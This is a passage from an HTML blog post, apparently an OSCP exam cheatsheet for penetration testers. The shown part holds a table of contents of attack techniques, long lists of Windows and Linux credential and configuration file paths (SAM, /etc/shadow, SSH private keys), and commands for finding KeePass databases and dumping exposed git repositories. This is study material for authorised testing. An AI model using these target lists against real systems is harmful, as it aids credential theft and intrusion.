<!DOCTYPE html>
<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">OSCP Cheatsheet | Sai Sathvik</title>
<meta property="og:title" content="OSCP Cheatsheet | Sai Sathvik" />
<meta name="twitter:title" content="OSCP Cheatsheet | Sai Sathvik" />
<meta itemprop="name" content="OSCP Cheatsheet | Sai Sathvik" />
<meta name="application-name" content="OSCP Cheatsheet | Sai Sathvik" />
<meta property="og:site_name" content="Sai Sathvik" />

<meta name="description" content="A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation.">
<meta itemprop="description" content="A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation." />
<meta property="og:description" content="A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation." />
<meta name="twitter:description" content="A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation." />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />

  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/oscp-cheatsheet/" title="English" />





    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-08-21T00:00:00Z />
    <meta property="article:published_time" content=2024-08-21T00:00:00Z />
    <meta property="og:url" content="http://localhost:1313/posts/oscp-cheatsheet/" />

    
    <meta property="og:article:author" content="Sai Sathvik" />
    <meta property="article:author" content="Sai Sathvik" />
    <meta name="author" content="Sai Sathvik" />
    
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "OSCP Cheatsheet",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-08-21",
        "description": "A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation.",
        "wordCount":  5874 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-08-21",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "Sai Sathvik"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.148.2">

    
    <meta property="og:url" content="http://localhost:1313/posts/oscp-cheatsheet/">
  <meta property="og:site_name" content="Sai Sathvik">
  <meta property="og:title" content="OSCP Cheatsheet">
  <meta property="og:description" content="A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation.">
  <meta property="og:locale" content="en_gb">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-21T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-21T00:00:00+00:00">


    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="OSCP Cheatsheet">
  <meta name="twitter:description" content="A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation.">


    

    <link rel="canonical" href="http://localhost:1313/posts/oscp-cheatsheet/">
    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
</head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/pages/about/">
                        About
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">OSCP Cheatsheet</h1>
                
                
                
                <div class="post-meta">
                    <time datetime="2024-08-21T00:00:00&#43;00:00" itemprop="datePublished"> 21 Aug 2024 </time>
                </div>
                
            </header>
            
    
    <details class="toc" ZgotmplZ>
        <summary><b>Table of Contents</b></summary>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#important-locations">Important Locations</a>
      <ul>
        <li><a href="#github-recon">GitHub recon</a></li>
      </ul>
    </li>
    <li><a href="#connecting-to-rdp">Connecting to RDP</a></li>
    <li><a href="#adding-ssh-public-key">Adding SSH Public key</a></li>
    <li><a href="#file-transfers">File Transfers</a>
      <ul>
        <li><a href="#windows-to-kali">Windows to Kali</a></li>
      </ul>
    </li>
    <li><a href="#adding-users">Adding Users</a>
      <ul>
        <li><a href="#windows">Windows</a></li>
        <li><a href="#linux">Linux</a></li>
      </ul>
    </li>
    <li><a href="#password-hash-cracking">Password-Hash Cracking</a>
      <ul>
        <li><a href="#fcrackzip">fcrackzip</a></li>
        <li><a href="#john">John</a></li>
        <li><a href="#hashcat">Hashcat</a></li>
      </ul>
    </li>
    <li><a href="#pivoting-through-ssh">Pivoting through SSH</a></li>
    <li><a href="#dealing-with-passwords">Dealing with Passwords</a></li>
    <li><a href="#impacket">Impacket</a></li>
    <li><a href="#evil-winrm">Evil-Winrm</a></li>
    <li><a href="#mimikatz">Mimikatz</a></li>
    <li><a href="#ligolo-ng">Ligolo-ng</a></li>
  </ul>

  <ul>
    <li><a href="#port-scanning">Port Scanning</a></li>
    <li><a href="#ftp-enumeration">FTP enumeration</a></li>
    <li><a href="#ssh-enumeration">SSH enumeration</a></li>
    <li><a href="#smb-enumeration">SMB enumeration</a></li>
    <li><a href="#https-enumeration">HTTP/S enumeration</a>
      <ul>
        <li><a href="#wordpress">Wordpress</a></li>
        <li><a href="#drupal">Drupal</a></li>
        <li><a href="#joomla">Joomla</a></li>
      </ul>
    </li>
    <li><a href="#dns-enumeration">DNS enumeration</a></li>
    <li><a href="#smtp-enumeration">SMTP enumeration</a></li>
    <li><a href="#ldap-enumeration">LDAP Enumeration</a></li>
    <li><a href="#nfs-enumeration">NFS Enumeration</a></li>
    <li><a href="#snmp-enumeration">SNMP Enumeration</a></li>
    <li><a href="#rpc-enumeration">RPC Enumeration</a></li>
  </ul>

  <ul>
    <li><a href="#directory-traversal">Directory Traversal</a></li>
    <li><a href="#local-file-inclusion">Local File Inclusion</a></li>
    <li><a href="#sql-injection">SQL Injection</a></li>
  </ul>

  <ul>
    <li><a href="#finding-exploits">Finding Exploits</a>
      <ul>
        <li><a href="#searchsploit">Searchsploit</a></li>
      </ul>
    </li>
    <li><a href="#reverse-shells">Reverse Shells</a>
      <ul>
        <li><a href="#msfvenom">Msfvenom</a></li>
        <li><a href="#one-liners">One Liners</a></li>
        <li><a href="#groovy-reverse-shell">Groovy reverse-shell</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#manual-enumeration-commands">Manual Enumeration commands</a></li>
    <li><a href="#automated-scripts">Automated Scripts</a></li>
    <li><a href="#token-impersonation">Token Impersonation</a></li>
    <li><a href="#services">Services</a>
      <ul>
        <li><a href="#binary-hijacking">Binary Hijacking</a></li>
        <li><a href="#unquoted-service-path">Unquoted Service Path</a></li>
        <li><a href="#insecure-service-executables">Insecure Service Executables</a></li>
        <li><a href="#weak-registry-permissions">Weak Registry permissions</a></li>
      </ul>
    </li>
    <li><a href="#dll-hijacking">DLL Hijacking</a></li>
    <li><a href="#autorun">Autorun</a></li>
    <li><a href="#alwaysinstallelevated">AlwaysInstallElevated</a></li>
    <li><a href="#schedules-tasks">Schedules Tasks</a></li>
    <li><a href="#startup-apps">Startup Apps</a></li>
    <li><a href="#insecure-gui-apps">Insecure GUI apps</a></li>
    <li><a href="#sam-and-system">SAM and SYSTEM</a></li>
    <li><a href="#passwords">Passwords</a>
      <ul>
        <li><a href="#sensitive-files">Sensitive files</a></li>
        <li><a href="#config-files">Config files</a></li>
        <li><a href="#registry">Registry</a></li>
        <li><a href="#runas---savedcreds">RunAs - Savedcreds</a></li>
        <li><a href="#pass-the-hash">Pass the Hash</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#tty-shell">TTY Shell</a></li>
    <li><a href="#basic">Basic</a></li>
    <li><a href="#automated-scripts-1">Automated Scripts</a></li>
    <li><a href="#sensitive-information">Sensitive Information</a></li>
    <li><a href="#sudosuidcapabilities">Sudo/SUID/Capabilities</a></li>
    <li><a href="#cron-jobs">Cron Jobs</a></li>
    <li><a href="#nfs">NFS</a></li>
  </ul>

  <ul>
    <li><a href="#sensitive-information-1">Sensitive Information</a>
      <ul>
        <li><a href="#powershell-history">Powershell History</a></li>
        <li><a href="#searching-for-passwords">Searching for passwords</a></li>
        <li><a href="#searching-in-registry-for-passwords">Searching in Registry for Passwords</a></li>
        <li><a href="#kdbx-files">KDBX Files</a></li>
      </ul>
    </li>
    <li><a href="#dumping-hashes">Dumping Hashes</a></li>
  </ul>

  <ul>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#powerview">Powerview</a></li>
        <li><a href="#bloodhound">Bloodhound</a></li>
        <li><a href="#ldapdomaindump">LDAPDOMAINDUMP</a></li>
        <li><a href="#plumhound">PlumHound</a></li>
        <li><a href="#pingcastle">PingCastle</a></li>
        <li><a href="#psloggedon">PsLoggedon</a></li>
        <li><a href="#gpp-or-cpassword">GPP or CPassword</a></li>
      </ul>
    </li>
    <li><a href="#attacking-active-directory"><strong>Attacking Active Directory</strong></a>
      <ul>
        <li><a href="#zerologon">Zerologon</a></li>
        <li><a href="#password-spraying">Password Spraying</a></li>
        <li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
        <li><a href="#kerberoasting">Kerberoasting</a></li>
        <li><a href="#silver-tickets">Silver Tickets</a></li>
        <li><a href="#secretsdump">Secretsdump</a></li>
        <li><a href="#dumping-ntdsdit">Dumping NTDS.dit</a></li>
      </ul>
    </li>
    <li><a href="#lateral-movement-in-active-directory">Lateral Movement in Active Directory</a>
      <ul>
        <li><a href="#psexec---smbexec---wmiexec---atexec">psexec - smbexec - wmiexec - atexec</a></li>
        <li><a href="#winrs">winrs</a></li>
        <li><a href="#crackmapexec">crackmapexec</a></li>
        <li><a href="#pass-the-ticket">Pass the ticket</a></li>
        <li><a href="#dcom">DCOM</a></li>
        <li><a href="#golden-ticket">Golden Ticket</a></li>
        <li><a href="#shadow-copies">Shadow Copies</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </details>
            <div class="page-content">
                <p><strong>Prepared as part of my OSCP Preparation.</strong></p>
<ul>
<li>Successfully passed the OSCP exam on May 20, 2024. Verify my achievement <a href="https://www.credential.net/666b9a86-017d-48fa-894a-5c39ef1d7b7b">here</a>.</li>
<li>Feel free to open a pull request if you have any corrections, improvements, or new additions!</li>
<li>You can access my cheatsheet from here: <a href="https://s4thv1k.com/posts/oscp-cheatsheet/">https://s4thv1k.com/posts/oscp-cheatsheet/</a> as well!</li>
<li>Helped over 20 individuals in passing their exam:) Please let me know if this helped you too ❤️</li>
</ul>
<h1 id="general">General</h1>
<aside>
💡 For Finding all important files in Windows (CTF Style)
<p><code>cd c:\Users</code> then
<code>tree /F</code></p>
</aside>
<h2 id="important-locations">Important Locations</h2>
<details>
<summary>Windows</summary>
Windows
<pre><code>```powershell
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```
</code></pre>
</details>
<details>
<summary>Linux</summary>
<pre><code>```powershell
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/&lt;PID&gt;/cmdline
/proc/&lt;PID&gt;/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html&lt;VHOST&gt;/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
#id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_edcsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```
</code></pre>
</details>
<p><strong>Discovering KDBX files</strong></p>
<ol>
<li>In Windows</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span></code></pre></div><ol start="2">
<li>In Linux</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -name *.kdbx 2&gt;/dev/null
</span></span></code></pre></div><h3 id="github-recon">GitHub recon</h3>
<ul>
<li>You need to find traces of the <code>.git</code> files on the target machine.</li>
<li>Now navigate to the directory where the file is located, a potential repository.</li>
<li>Commands</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">Log</span> <span class="nx">information</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">repository</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nx">git</span> <span class="nx">log</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">This</span> <span class="nx">will</span> <span class="nx">display</span> <span class="nx">the</span> <span class="nx">log</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">stuff</span> <span class="nx">happened</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">commit</span> <span class="nx">history</span> <span class="nx">which</span> <span class="nx">is</span> <span class="nx">very</span> <span class="nx">useful</span>
</span></span><span class="line"><span class="cl"><span class="nx">git</span> <span class="nx">show</span> <span class="p">&lt;</span><span class="nt">commit</span><span class="err">-</span><span class="na">id</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">This</span> <span class="nx">shows</span> <span class="nx">the</span> <span class="nx">commit</span> <span class="nx">information</span> <span class="nx">and</span> <span class="nx">the</span> <span class="nx">newly</span> <span class="nx">added</span> <span class="nx">stuff</span><span class="p">.</span>
</span></span></code></pre></div><ul>
<li>If you identify <code>.git</code> active on the website. Use <a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a> now it downloads all the files and saves it locally. Perform the same above commands and escalate.</li>
<li>Some useful GitHub dorks: <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets">https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets</a> → this might not be relevant to the exam environment.</li>
</ul>
<h2 id="connecting-to-rdp">Connecting to RDP</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xfreerdp /u:uname /p:<span class="s1">&#39;pass&#39;</span> /v:IP
</span></span><span class="line"><span class="cl">xfreerdp /d:domain.com /u:uname /p:<span class="s1">&#39;pass&#39;</span> /v:IP
</span></span><span class="line"><span class="cl">xfreerdp /u:uname /p:<span class="s1">&#39;pass&#39;</span> /v:IP +clipboard <span class="c1">#try this option if normal login doesn&#39;t work</span>
</span></span></code></pre></div><h2 id="adding-ssh-public-key">Adding SSH Public key</h2>
<ul>
<li>This can be used to get ssh session, on target machine which is based on linux</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">ssh</span><span class="o">-</span><span class="nx">keygen</span> <span class="o">-</span><span class="nx">t</span> <span class="nx">rsa</span> <span class="o">-</span><span class="nx">b</span> <span class="mi">4096</span> <span class="err">#</span><span class="nx">give</span> <span class="nx">any</span> <span class="nx">password</span>
</span></span><span class="line"><span class="cl">
